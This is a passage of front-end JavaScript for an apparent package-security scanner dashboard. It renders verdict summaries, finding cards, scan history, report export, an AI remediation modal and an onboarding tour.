    const hasBidi = findings.some(f => (f.rule_id || "").includes("BIDI"));

    if (hasCanary && hasNet) {
        return "Do not install this. It attempts to steal private cloud credentials and send them over the internet.";
    }
    if (hasReverse) {
        return "Do not install this. It tries to open a hidden reverse shell giving attackers remote access to your computer.";
    }
    if (hasCanary) {
        return "Do not install this. It attempts to read decoy credentials and secret system files.";
    }
    if (hasObf && hasProc) {
        return "Do not install this. It unpacks hidden disguised code and runs background shell commands.";
    }
    if (hasBidi) {
        return "Dangerous package. It uses invisible Trojan Source Unicode characters to hide malicious behavior.";
    }
    if (verdict === "CRITICAL_MALICIOUS") {
        return "Do not install this. It attempts dangerous system actions that threaten your environment.";
    }
    if (verdict === "SUSPICIOUS") {
        return "Needs a human review. This package uses sensitive operations that may or may not be intentional.";
    }

    return "Looks safe. No critical security threats were observed during compilation or detonation.";
}

// ── Concrete Action Guidance Generator ───────────────────────────────────────
function renderActionGuidance(verdict, findings) {
    const list = document.getElementById("action-steps-list");
    if (!list) return;

    list.innerHTML = "";

    let steps = [];
    if (verdict === "CLEAN") {
        steps = [
            "This dependency passed AST structural checks and sandbox detonation with no threats detected.",
            "You can safely install this package in your development environment.",
            "Best practice: Verify the author and download count on the official PyPI registry."
        ];
    } else if (verdict === "SUSPICIOUS") {
        steps = [
            "Do not install automatically in production or CI/CD pipelines.",
            "Review the flagged code lines below with your team lead or security engineer.",
            "If the sensitive operations (e.g., subprocess or decompression) are expected for this package, you may pin this exact hash."
        ];
    } else {
        steps = [
            "Do not install or execute this package under any circumstances.",
            "If this code was already run on any developer machine, immediately revoke and rotate all AWS tokens, SSH keys, and passwords.",
            "Report this package name and repository link to the Python Packaging Authority (PyPI) security response team."
        ];
    }

    steps.forEach(stepText => {
        const li = document.createElement("li");
        li.textContent = stepText;
        list.appendChild(li);
    });
}

// ── Render Findings (Simple Cards & Technical Table) ─────────────────────────
function renderFindingsViews(findings) {
    const countPill = document.getElementById("findings-count-pill");
    if (countPill) {
        countPill.textContent = `${findings.length} finding${findings.length === 1 ? "" : "s"}`;
    }

    const simpleCards = document.getElementById("simple-cards-container");
    const techTbody = document.getElementById("technical-findings-tbody");

    // Empty state
    if (!findings || findings.length === 0) {
        if (simpleCards) {
            simpleCards.innerHTML = `
                <div class="empty-state">
                    <i class="fa-solid fa-shield-check" style="color: var(--color-clean); font-size: 2rem;"></i>
                    <p style="margin-top: 8px;"><strong>Zero threats detected.</strong> Source code passed AST static inspection and sandbox detonation.</p>
                </div>
            `;
        }
        if (techTbody) {
            techTbody.innerHTML = `
                <tr>
                    <td colspan="6" class="text-muted" style="text-align: center; padding: var(--space-4);">No technical findings recorded. Package verified clean.</td>
                </tr>
            `;
        }
        return;
    }

    // 1. Simple View (Top 3 findings with plain English cards)
    if (simpleCards) {
        simpleCards.innerHTML = "";
        const topFindings = findings.slice(0, 3);

        topFindings.forEach((f, idx) => {
            const ruleId = f.rule_id || f.category || "RULE-UNKNOWN";
            const explanation = getRuleExplanation(ruleId, f.description, f.snippet || f.evidence);
            const severity = (f.severity || "MEDIUM").toUpperCase();

            const card = document.createElement("div");
            card.className = "finding-card";

            let badgeClass = "badge-medium";
            if (severity === "CRITICAL") badgeClass = "badge-critical";
            else if (severity === "HIGH") badgeClass = "badge-high";
            else if (severity === "LOW") badgeClass = "badge-low";

            card.innerHTML = `
                <div class="finding-header">
                    <span class="finding-plain-title"><i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i> ${escapeHtml(explanation.title)}</span>
                    <span class="badge-tag ${badgeClass}">${escapeHtml(severity)}</span>
                </div>
                <div class="finding-reason-text"><strong>Why this is risky:</strong> ${escapeHtml(explanation.risk)}</div>
                <div class="finding-saw-text"><strong>What we saw:</strong> ${escapeHtml(explanation.whatSaw)}</div>
                <div class="finding-meta-row">
                    <span class="rule-id-secondary">Rule: ${escapeHtml(ruleId)}</span>
                    ${f.line ? `<span>Line ${escapeHtml(f.line)}</span>` : ""}
                </div>
            `;
            simpleCards.appendChild(card);
        });

        if (findings.length > 3) {
            const moreNote = document.createElement("p");
            moreNote.className = "text-muted";
            moreNote.style.fontSize = "0.82rem";
            moreNote.style.textAlign = "center";
            moreNote.style.marginTop = "var(--space-2)";
            moreNote.innerHTML = `+ ${findings.length - 3} more finding(s). Switch to <strong>Technical View</strong> in the top bar to inspect all findings.`;
            simpleCards.appendChild(moreNote);
        }
    }

    // 2. Technical View Table
    if (techTbody) {
        techTbody.innerHTML = "";

        findings.forEach((f, idx) => {
            const ruleId = f.rule_id || f.category || "RULE-UNKNOWN";
            const severity = (f.severity || "MEDIUM").toUpperCase();
            const desc = f.description || f.message || "Security finding triggered";
            const line = f.line !== undefined ? f.line : "--";
            const mitre = f.mitre_id || f.mitre_tag || "T1059";

            let badgeClass = "badge-medium";
            if (severity === "CRITICAL") badgeClass = "badge-critical";
            else if (severity === "HIGH") badgeClass = "badge-high";
            else if (severity === "LOW") badgeClass = "badge-low";

            const tr = document.createElement("tr");
            tr.innerHTML = `
                <td><span class="badge-tag ${badgeClass}">${escapeHtml(severity)}</span></td>
                <td><code>${escapeHtml(ruleId)}</code></td>
                <td>
                    <div>${escapeHtml(desc)}</div>
                    ${f.snippet ? `<pre class="code-snippet-pre">${escapeHtml(f.snippet)}</pre>` : ""}
                </td>
                <td>${escapeHtml(line)}</td>
                <td>
                    <a href="https://attack.mitre.org/techniques/${escapeHtml(mitre.replace('.', '/'))}" target="_blank" rel="noopener" class="mitre-tag" title="View MITRE technique definition">
                        <i class="fa-solid fa-arrow-up-right-from-square" aria-hidden="true"></i> ${escapeHtml(mitre)}
                    </a>
                </td>
                <td>
                    <button type="button" class="btn-secondary" style="font-size: 0.75rem; padding: 4px 8px;" onclick="openAiFixModal(${idx})" title="Generate automated security remediation">
                        <i class="fa-solid fa-wand-magic-sparkles" aria-hidden="true"></i> AI Fix
                    </button>
                </td>
            `;
            techTbody.appendChild(tr);
        });
    }

    // Cache findings for AI Fix modal
    window._lastRenderedFindings = findings;
}

// ── Report Export Handlers ───────────────────────────────────────────────────
function exportReport(format) {
    if (!appState.currentScanReport) {
        alert("Please run a scan first before exporting.");
        return;
    }

    const scanId = appState.currentScanReport.scan_id || appState.currentScanReport.id;

    if (format === "html") {
        if (scanId) {
            window.open(`${API_BASE_URL}/api/scan/${scanId}/report/html`, "_blank");
        } else {
            alert("No persistent scan ID available for this scan session.");
        }
    } else if (format === "json") {
        const jsonStr = JSON.stringify(appState.currentScanReport, null, 2);
        const blob = new Blob([jsonStr], { type: "application/json" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `supplyshield_report_${scanId || Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }
}

function copyCliCommand() {
    const cliText = `python -m supplyshield scan input_sample.py --timeout 10 --strict`;
    navigator.clipboard.writeText(cliText)
        .then(() => alert(`CLI scan command copied to clipboard:\n${cliText}`))
        .catch(() => alert("Could not copy CLI command."));
}

// ── Scan Audit History Loader & Filter ───────────────────────────────────────
async function loadHistoryData() {
    const tbody = document.getElementById("history-table-tbody");
    if (!tbody) return;

    tbody.innerHTML = `<tr><td colspan="6" class="text-muted" style="text-align: center; padding: var(--space-4);">Loading historical records from SQLite ledger...</td></tr>`;

    try {
        const res = await fetch(`${API_BASE_URL}/api/history`, {
            headers: getAuthHeaders()
        });

        if (!res.ok) throw new Error(`HTTP ${res.status}`);

        const data = await res.json();
        appState.historyData = Array.isArray(data) ? data : [];
        renderHistoryTable(appState.historyData);

    } catch (err) {
        tbody.innerHTML = `
            <tr>
                <td colspan="6" style="text-align: center; color: var(--color-critical); padding: var(--space-4);">
                    <i class="fa-solid fa-circle-exclamation" aria-hidden="true"></i> Failed to load audit history: ${escapeHtml(err.message)}
                </td>
            </tr>
        `;
    }
}

function filterHistoryTable() {
    const searchVal = (document.getElementById("history-search-input")?.value || "").toLowerCase().trim();
    const verdictFilter = document.getElementById("history-verdict-filter")?.value || "ALL";

    const filtered = appState.historyData.filter(item => {
        const matchesSearch = !searchVal || 
            String(item.id).toLowerCase().includes(searchVal) ||
            String(item.target_file || "").toLowerCase().includes(searchVal);

        const matchesVerdict = verdictFilter === "ALL" || item.verdict === verdictFilter;

        return matchesSearch && matchesVerdict;
    });

    renderHistoryTable(filtered);
}

function renderHistoryTable(records) {
    const tbody = document.getElementById("history-table-tbody");
    if (!tbody) return;

    if (!records || records.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="6" style="text-align: center; padding: var(--space-6);">
                    <div class="empty-state">
                        <i class="fa-solid fa-clock-rotate-left" style="font-size: 1.8rem; color: var(--text-muted);"></i>
                        <p style="margin: 8px 0;">No scan records found in the audit ledger.</p>
                        <button type="button" class="btn-primary" onclick="navigateTo('scan')" style="margin-top: 4px;">Run your first scan</button>
                    </div>
                </td>
            </tr>
        `;
        return;
    }

    tbody.innerHTML = "";

    records.forEach(item => {
        const idSafe = escapeHtml(item.id);
        const targetSafe = escapeHtml(item.target_file || "snippet.py");
        const riskVal = Math.round(item.risk_score || 0);
        const verdictSafe = escapeHtml(item.verdict || "CLEAN");
        const slsaSafe = escapeHtml(item.slsa_tier || "SLSA Level 4");
        const dateSafe = item.created_at ? new Date(item.created_at).toLocaleTimeString() : "--";

        let badgeClass = "badge-clean";
        if (item.verdict === "CRITICAL_MALICIOUS") badgeClass = "badge-critical";
        else if (item.verdict === "SUSPICIOUS") badgeClass = "badge-medium";

        const tr = document.createElement("tr");
        tr.innerHTML = `
            <td><strong>#${idSafe}</strong><br><span class="text-muted" style="font-size: 0.72rem;">${escapeHtml(dateSafe)}</span></td>
            <td><code>${targetSafe}</code></td>
            <td><strong>${riskVal}</strong>/100</td>
            <td><span class="badge-tag ${badgeClass}">${verdictSafe}</span></td>
            <td><span class="badge-tag badge-slsa">${slsaSafe}</span></td>
            <td>
                <button type="button" class="btn-secondary" style="font-size: 0.75rem; padding: 4px 8px;" onclick="viewScanDetails(${item.id})">
                    <i class="fa-solid fa-eye" aria-hidden="true"></i> View
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

async function viewScanDetails(scanId) {
    try {
        const res = await fetch(`${API_BASE_URL}/api/scan/${scanId}`, {
            headers: getAuthHeaders()
        });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);

        const data = await res.json();
        const scanObj = data.report || data;

        const content = document.getElementById("modal-report-content");
        if (content) {
            content.innerHTML = `
                <div style="font-family: var(--font-mono); line-height: 1.6;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
                        <div>
                            <p style="margin:0;"><strong>Audit ID:</strong> #${escapeHtml(scanId)}</p>
                            <p style="margin:0;"><strong>Target Package:</strong> <code>${escapeHtml(scanObj.target_file || "snippet.py")}</code></p>
                        </div>
                        <div style="display: flex; gap: 8px;">
                            <button type="button" class="btn-primary" style="padding: 6px 12px; font-size: 12px;" onclick="window.open('${API_BASE_URL}/api/scan/${scanId}/report/html', '_blank')">
                                <i class="fa-solid fa-file-code" aria-hidden="true"></i> HTML Report
                            </button>
                        </div>
                    </div>
                    <p><strong>Verdict:</strong> ${escapeHtml(scanObj.verdict || "UNKNOWN")}</p>
                    <p><strong>Risk Score:</strong> <span style="font-size: 18px; font-weight: 700;">${Math.round(scanObj.risk_score || scanObj.composite_risk_score || 0)}/100</span></p>
                    <p><strong>Timestamp:</strong> ${escapeHtml(scanObj.created_at || new Date().toISOString())}</p>
                    <hr style="border: 0; border-top: 1px solid var(--border-subtle); margin: 14px 0;">
                    <h5>Findings Payload (${scanObj.findings ? scanObj.findings.length : 0}):</h5>
                    <pre style="background: var(--bg-app); border: 1px solid var(--border-subtle); padding: 12px; border-radius: var(--radius-md); font-size: 11px; max-height: 240px; overflow-y: auto;">${escapeHtml(JSON.stringify(scanObj.findings || [], null, 2))}</pre>
                </div>
            `;
        }

        openModal("report-modal");

    } catch (err) {
        alert(`Could not load scan details: ${err.message}`);
    }
}

// ── Automated AI Security Remediation Modal ──────────────────────────────────
async function openAiFixModal(findingIndex) {
    const finding = (window._lastRenderedFindings || [])[findingIndex];
    if (!finding) return;

    const modalBody = document.getElementById("ai-fix-modal-body");
    openModal("ai-fix-modal");

    if (modalBody) {
        modalBody.innerHTML = `
            <div style="text-align: center; padding: var(--space-6);">
                <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2rem; color: var(--color-accent);" aria-hidden="true"></i>
                <p style="margin-top: var(--space-3); font-weight: 600;">Generating automated security patch &amp; refactoring code...</p>
            </div>
        `;
    }

    try {
        const payload = {
            code_snippet: finding.snippet || document.getElementById("code-input")?.value || "",
            rule_id: finding.rule_id || finding.category || "SECURITY_VULNERABILITY",
            description: finding.description || "Security Finding Detected",
            language: "python"
        };

        const res = await fetch(`${API_BASE_URL}/api/scan/ai-fix`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                ...getAuthHeaders()
            },
            body: JSON.stringify(payload)
        });

        if (!res.ok) throw new Error(`HTTP ${res.status}`);

        const data = await res.json();

        if (modalBody) {
            modalBody.innerHTML = `
                <div style="display: flex; flex-direction: column; gap: var(--space-3);">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span style="font-weight: 700; font-size: 1rem; color: var(--color-accent);"><i class="fa-solid fa-shield-halved" aria-hidden="true"></i> ${escapeHtml(data.title || "Automated Remediation")}</span>
                        <span class="badge-tag badge-slsa">${escapeHtml(data.provider || "Local Deterministic Engine")}</span>
                    </div>

                    <div style="background: var(--bg-surface-elevated); border-left: 3px solid var(--color-accent); padding: var(--space-3); border-radius: var(--radius-sm); font-size: 0.84rem;">
                        <strong>Security Analysis:</strong> ${escapeHtml(data.explanation || "No explanation provided.")}
                    </div>

                    <div>
                        <h5 style="margin-bottom: 4px; color: var(--color-critical); font-size: 0.84rem;"><i class="fa-solid fa-bug" aria-hidden="true"></i> Vulnerable Pattern:</h5>
                        <pre style="background: var(--color-critical-bg); border: 1px solid var(--color-critical-border); padding: var(--space-2); border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 0.78rem; overflow-x: auto;">${escapeHtml(data.original_code || "")}</pre>
                    </div>

                    <div>
                        <h5 style="margin-bottom: 4px; color: var(--color-clean); font-size: 0.84rem;"><i class="fa-solid fa-circle-check" aria-hidden="true"></i> Secure Replacement (Patch):</h5>
                        <pre style="background: var(--color-clean-bg); border: 1px solid var(--color-clean-border); padding: var(--space-2); border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 0.78rem; overflow-x: auto;">${escapeHtml(data.fixed_code || "")}</pre>
                    </div>

                    <div style="display: flex; justify-content: flex-end; gap: var(--space-2); margin-top: var(--space-2);">
                        <button type="button" class="btn-secondary" onclick="navigator.clipboard.writeText(\`${escapeJs(data.fixed_code || "")}\`); alert('Copied patch to clipboard!');">
                            <i class="fa-solid fa-copy" aria-hidden="true"></i> Copy Patch
                        </button>
                        <button type="button" class="btn-primary" onclick="closeModal('ai-fix-modal')">Done</button>
                    </div>
                </div>
            `;
        }
    } catch (err) {
        if (modalBody) {
            modalBody.innerHTML = `
                <div style="text-align: center; padding: var(--space-4); color: var(--color-critical);">
                    <i class="fa-solid fa-triangle-exclamation" style="font-size: 2rem;" aria-hidden="true"></i>
                    <p style="margin-top: 8px;">Remediation failed: ${escapeHtml(err.message)}</p>
                </div>
            `;
        }
    }
}

// ── Onboarding Tour Controller ───────────────────────────────────────────────
function checkFirstRunTour() {
    const seen = sessionStorage.getItem("supplyshield_tour_seen");
    if (!seen) {
        startTour();
    }
}

function startTour() {
    appState.tourCurrentStep = 0;
    renderTourStep();
    openModal("tour-modal");
}

function renderTourStep() {
    const container = document.getElementById("tour-step-content");
    if (!container) return;

    const step = TOUR_STEPS[appState.tourCurrentStep];
    const isLast = appState.tourCurrentStep === TOUR_STEPS.length - 1;

    container.innerHTML = `
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: var(--space-3);">
            <h4 style="margin: 0; font-size: 1.05rem;">${step.title}</h4>
            <span class="badge-tag badge-slsa">${step.badge}</span>
        </div>
        <p class="text-secondary" style="font-size: 0.88rem; line-height: 1.6; margin-bottom: var(--space-6);">
            ${step.body}
        </p>
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <button type="button" class="btn-secondary" onclick="skipTour()">Skip tour</button>
            <div style="display: flex; gap: var(--space-2);">
                ${appState.tourCurrentStep > 0 ? `<button type="button" class="btn-secondary" onclick="prevTourStep()">Back</button>` : ""}
                <button type="button" class="btn-primary" onclick="${isLast ? "finishTour()" : "nextTourStep()"}">
                    ${isLast ? "Finish &amp; Start" : "Next"}
                </button>
            </div>
        </div>
    `;
}

function nextTourStep() {
    if (appState.tourCurrentStep < TOUR_STEPS.length - 1) {
        appState.tourCurrentStep++;
        renderTourStep();
    }
}

function prevTourStep() {
    if (appState.tourCurrentStep > 0) {
        appState.tourCurrentStep--;
        renderTourStep();
    }
}

function skipTour() {
    sessionStorage.setItem("supplyshield_tour_seen", "true");
    closeModal("tour-modal");
}

function finishTour() {
    sessionStorage.setItem("supplyshield_tour_seen", "true");
    closeModal("tour-modal");
}

// ── Glossary Initializer (About Page & Tooltips) ─────────────────────────────
function initGlossary() {
    const grid = document.getElementById("glossary-items-grid");
    if (!grid) return;

    grid.innerHTML = "";

    Object.keys(GLOSSARY).forEach(key => {
        const item = GLOSSARY[key];
        const card = document.createElement("div");
        card.style.background = "var(--bg-surface-elevated)";
        card.style.border = "1px solid var(--border-subtle)";
        card.style.borderRadius = "var(--radius-md)";
        card.style.padding = "var(--space-3)";

        card.innerHTML = `
            <div style="font-weight: 700; color: var(--color-accent); font-size: 0.88rem; margin-bottom: 4px;">
                <i class="fa-solid fa-circle-question" aria-hidden="true"></i> ${escapeHtml(item.term)}
            </div>
            <p style="font-size: 0.80rem; color: var(--text-secondary); margin: 0; line-height: 1.5;">
                ${escapeHtml(item.explanation)}
            </p>
        `;
        grid.appendChild(card);
    });
}

// ── API Key Settings Manager ─────────────────────────────────────────────────
function saveApiKey() {
    const input = document.getElementById("api-key-input");
    const keyVal = input ? input.value.trim() : "";
    if (keyVal) {
        sessionStorage.setItem("supplyshield_api_key", keyVal);
        alert("API Key saved in sessionStorage (will expire when this browser tab closes).");
    } else {
        sessionStorage.removeItem("supplyshield_api_key");
        alert("API Key cleared.");
    }
    closeModal("settings-modal");
    checkBackendHealth();
}

// ── Generic Modal Helpers ────────────────────────────────────────────────────
function openModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.classList.remove("hidden");
        // Focus first focusable element for accessibility
        const focusable = modal.querySelector("button, input, select, textarea");
        if (focusable) focusable.focus();
    }
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.classList.add("hidden");
    }
}

// Close modals on Escape key
document.addEventListener("keydown", (e) => {
    if (e.key === "Escape") {
        document.querySelectorAll(".modal-overlay:not(.hidden)").forEach(m => {
            m.classList.add("hidden");
        });
    }
});

// ── HTML / JS Sanitization Helpers ───────────────────────────────────────────
function escapeHtml(str) {
    if (str === null || str === undefined) return "";
    return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function escapeJs(str) {
    if (!str) return "";
    return String(str)
        .replace(/\\/g, "\\\\")
        .replace(/`/g, "\\`")
        .replace(/\$/g, "\\$");
}

// Global window exposure for HTML event handlers
window.navigateTo = navigateTo;
window.setViewMode = setViewMode;
window.switchInputTab = switchInputTab;
window.loadPresetSample = loadPresetSample;
window.loadPresetFromDropdown = loadPresetFromDropdown;
window.updateCharCount = updateCharCount;
window.executeScan = executeScan;
window.exportReport = exportReport;
window.copyCliCommand = copyCliCommand;
window.loadHistoryData = loadHistoryData;
window.filterHistoryTable = filterHistoryTable;
window.viewScanDetails = viewScanDetails;
window.openAiFixModal = openAiFixModal;
window.toggleTerminalAutoScroll = toggleTerminalAutoScroll;
window.clearTerminalLogs = clearTerminalLogs;
window.copyTerminalLogs = copyTerminalLogs;
window.toggleTheme = toggleTheme;
window.checkBackendHealth = checkBackendHealth;
window.startTour = startTour;
window.nextTourStep = nextTourStep;
window.prevTourStep = prevTourStep;
window.skipTour = skipTour;
window.finishTour = finishTour;
window.saveApiKey = saveApiKey;
window.openModal = openModal;
window.closeModal = closeModal;
window.handleDragOver = handleDragOver;
window.handleDragLeave = handleDragLeave;
window.handleFileDrop = handleFileDrop;
window.handleFilePicked = handleFilePicked;
window.escapeHtml = escapeHtml;
window.GLOSSARY = GLOSSARY;
window.RULES_EXPLANATION = RULES_EXPLANATION;
window.getRuleExplanation = getRuleExplanation;
window.generateHumanSummarySentence = generateHumanSummarySentence;
window.updateThreatDashboard = updateThreatDashboard;
window.setTheme = setTheme;
window.initTheme = initTheme;
window.renderActionGuidance = renderActionGuidance;
window.renderFindingsViews = renderFindingsViews;
window.updatePipelineStepper = updatePipelineStepper;
window.resetPipelineStepper = resetPipelineStepper;

